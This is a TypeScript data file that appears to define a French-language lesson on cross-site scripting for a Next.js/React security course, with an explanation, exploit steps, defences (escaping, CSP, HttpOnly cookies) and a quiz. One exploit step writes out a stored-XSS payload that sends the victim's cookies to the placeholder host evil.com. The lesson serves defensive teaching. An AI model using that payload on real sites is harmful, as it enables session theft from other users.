import { Attack } from "@/lib/types";

export const xss: Attack = {
  slug: "xss",
  name: "XSS (Cross-Site Scripting)",
  categoryId: "injection",
  severity: "high",
  summary:
    "L'attaquant injecte du JavaScript dans une page web vue par d'autres utilisateurs.",
  explanation: `Le Cross-Site Scripting (XSS) permet à un attaquant d'injecter du code JavaScript malicieux dans une page web. Quand un autre utilisateur visite cette page, le script s'exécute dans son navigateur avec ses permissions.

Il existe 3 types de XSS : le **Stored XSS** (le script est stocké en base de données, ex: un commentaire), le **Reflected XSS** (le script est dans l'URL et reflété dans la page), et le **DOM-based XSS** (le script manipule directement le DOM côté client).

L'attaquant peut voler les cookies de session, rediriger l'utilisateur vers un site malveillant, modifier le contenu de la page, ou même prendre le contrôle total du compte de la victime.`,
  realWorldScenario: `Dans ton app Next.js, si tu utilises \`dangerouslySetInnerHTML\` pour afficher du contenu utilisateur (commentaires, descriptions), ou si tu injectes du HTML brut depuis Supabase sans le sanitiser, un attaquant peut stocker un script dans ta base qui s'exécutera pour chaque visiteur de la page.`,
  exploitSteps: [
    "L'attaquant trouve un champ qui affiche du contenu utilisateur (commentaires, profil)",
    "Il poste un commentaire contenant <script>document.location='https://evil.com/steal?c='+document.cookie</script>",
    "Le commentaire est stocké en base de données",
    "Un autre utilisateur charge la page contenant le commentaire",
    "Le script s'exécute dans le navigateur de la victime et envoie ses cookies à l'attaquant",
  ],
  protections: [
    {
      title: "Échapper les sorties HTML",
      description:
        "React échappe automatiquement le contenu JSX. Ne jamais utiliser dangerouslySetInnerHTML avec du contenu utilisateur.",
      codeExample: `// MAL — Injection HTML directe
<div dangerouslySetInnerHTML={{ __html: userComment }} />

// BIEN — React échappe automatiquement
<div>{userComment}</div>`,
      language: "tsx",
    },
    {
      title: "Content Security Policy (CSP)",
      description:
        "Configurer un header CSP qui empêche l'exécution de scripts inline.",
      codeExample: `// next.config.ts
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: "default-src 'self'; script-src 'self'"
  }
];`,
      language: "typescript",
    },
    {
      title: "Cookies HttpOnly",
      description:
        "Marquer les cookies de session comme HttpOnly pour qu'ils ne soient pas accessibles via JavaScript.",
    },
  ],
  animationSteps: [
    {
      id: "comment",
      label: "Zone de commentaires sur une page web",
      duration: 2000,
    },
    {
      id: "inject",
      label: "L'attaquant poste un commentaire avec <script>",
      duration: 2500,
    },
    {
      id: "stored",
      label: "Le script est stocké en base de données",
      duration: 2000,
    },
    {
      id: "execute",
      label: "Un autre utilisateur charge la page — le script s'exécute",
      duration: 3000,
    },
    {
      id: "steal",
      label: "Le cookie de session part vers le serveur de l'attaquant",
      duration: 2500,
    },
  ],
  resources: [
    {
      label: "OWASP — XSS",
      url: "https://owasp.org/www-community/attacks/xss/",
    },
  ],
  quiz: [
    {
      question: "Quelle propriété React est dangereuse pour les attaques XSS ?",
      options: ["className", "dangerouslySetInnerHTML", "onClick", "useState"],
      correctIndex: 1,
      explanation:
        "dangerouslySetInnerHTML injecte du HTML brut dans le DOM sans échappement, permettant l'exécution de scripts malicieux.",
    },
    {
      question:
        "Quel type de XSS stocke le script malveillant en base de données ?",
      options: ["Reflected XSS", "DOM-based XSS", "Stored XSS", "Blind XSS"],
      correctIndex: 2,
      explanation:
        "Le Stored XSS persiste en base de données (ex : commentaire) et s'exécute pour chaque utilisateur qui charge la page.",
    },
    {
      question:
        "Quel header HTTP empêche l'exécution de scripts inline non autorisés ?",
      options: [
        "X-Frame-Options",
        "Content-Security-Policy",
        "Strict-Transport-Security",
        "X-Content-Type-Options",
      ],
      correctIndex: 1,
      explanation:
        "Le header Content-Security-Policy (CSP) permet de définir quelles sources de scripts sont autorisées, bloquant les scripts inline injectés.",
    },
  ],
};
